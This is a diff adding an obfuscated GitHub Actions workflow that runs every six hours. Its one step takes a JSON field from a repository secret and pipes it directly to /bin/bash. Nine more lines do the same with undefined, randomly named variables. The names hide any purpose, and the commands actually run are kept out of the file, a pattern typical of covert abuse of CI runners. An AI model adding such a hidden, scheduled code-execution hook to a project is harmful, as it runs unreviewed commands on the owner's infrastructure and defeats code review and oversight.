@@ -1,0 +1,26 @@
+name: zaizhongtubazhetiaoming
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '47 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zaizhongtubazhetiaoming
+        env:
+          cqfl6541: ${{ secrets.cqfl6541 }}
+        run: |
+          echo $cqfl6541 | jq -r .y5 | /bin/bash
+          echo $oz8 | jq -r .rt767 | /bin/bash
+          echo $axxd7 | jq -r .cbdp07 | /bin/bash
+          echo $mmb01961 | jq -r .xsx1 | /bin/bash
+          echo $uqbd2 | jq -r .ddub6545 | /bin/bash
+          echo $t01 | jq -r .gn0163 | /bin/bash
+          echo $peby22900 | jq -r .ykmy997 | /bin/bash
+          echo $e63885 | jq -r .smgn1201 | /bin/bash
+          echo $ylse67 | jq -r .mpztn846 | /bin/bash
+          echo $mcabm3093 | jq -r .fcql5190 | /bin/bash
+
